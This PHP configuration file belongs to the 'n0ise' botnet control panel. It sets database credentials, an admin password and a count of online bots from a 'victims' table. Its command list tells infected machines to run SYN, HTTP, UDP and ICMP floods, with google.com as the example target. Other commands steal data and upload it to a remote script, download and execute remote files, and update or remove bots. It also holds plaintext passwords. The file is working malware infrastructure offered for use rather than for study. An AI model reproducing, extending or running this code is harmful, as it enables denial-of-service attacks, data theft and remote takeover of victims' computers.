<?php

require_once __DIR__ . '/n0ise.class.php';

// Create the main object (connects using default credentials)
$_n0ise = new n0ise();

// Safely update MySQL credentials using the new setter method
$_n0ise->setMysqlConfig([
    'host' => 'localhost',
    'user' => 'n0ise',
    'pass' => '8b!49@9Bv4!@RzB',
    'db'   => 'n0ise',
]);

// Set the admin password and online timeout
$_n0ise->admin_password = 'AcYQ%I9oaHnb';  // Change for production!
$_n0ise->online = 3600; // 1 hour timeout (in seconds)

// Define command list
$_n0ise->commands = [
    'Syn-Flood'         => 'synflood*Host*Port*Threads*Sockets<br />For example: synflood*google.com*80*2*2',
    'HTTP-Flood'        => 'httpflood*Host*Threads<br />For example: httpflood*http://www.google.com/*5',
    'UDP-Flood'         => 'udpflood*Host*Port*Threads*Sockets*Packetsize<br />For example: udpflood*google.com*80*2*2*1024',
    'ICMP-Flood'        => 'icmpflood*Host*Port*Threads*Sockets*Packetsize<br />For example: icmpflood*google.com*80*2*2*1024',
    'Multi Stealer'     => 'steal*Link to Uploadscript<br />For example: steal*http://www.yourserver.com/stealer/script.php',
    'Download and Execute' => 'downandexe*LinkToFile<br />For example: downandexe*http://www.yourserver.com/yourfile.exe',
    'Visit Page'        => 'visit*Link<br />For example: visit*http://www.google.de/',
    'Bot Update'        => 'update*LinkToNewBot<br />For example: update*http://www.yourserver.com/newbot.exe',
    'Remove Bot'        => 'remove*Name<br />For example: remove*Admin-PC',
];

// Optional: Count online bots (use in panel dashboard if needed)
$onlineThreshold = time() - $_n0ise->online;
$stmt = $_n0ise->prepare("SELECT COUNT(*) AS botCount FROM n0ise_victims WHERE ConTime > ?");
if ($stmt) {
    $stmt->bind_param('i', $onlineThreshold);
    $stmt->execute();
    $result = $stmt->get_result();
    $data = $result->fetch_assoc();
    $_n0ise->online_bots = intval($data['botCount']);
} else {
    $_n0ise->online_bots = 0;
}

?>
